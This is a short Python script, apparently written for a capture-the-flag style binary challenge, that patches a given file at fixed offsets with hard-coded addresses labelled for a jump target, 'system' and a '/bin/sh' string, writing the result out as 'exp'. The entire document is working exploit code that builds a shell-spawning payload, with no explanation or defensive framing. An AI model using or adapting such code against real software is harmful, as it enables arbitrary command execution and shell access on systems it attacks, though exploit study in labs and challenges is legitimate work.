import sys, struct

addr = 0x08071112
offset = 0x3783

with open(sys.argv[1], 'rb') as fd:
    data = fd.read()

nd = data[:offset] + struct.pack('<I', addr) + data[offset+4:]

system_addr = 0x08070190
offset = 0x3772 - 0x62
nd = nd[:offset] + struct.pack('<I', system_addr) + nd[offset+4:]

binsh_addr = 0x080913b0
offset = 0x3772 - 0x5a
nd = nd[:offset] + struct.pack('<I', binsh_addr) + nd[offset+4:]

with open('exp', 'wb') as fd:
    fd.write(nd)
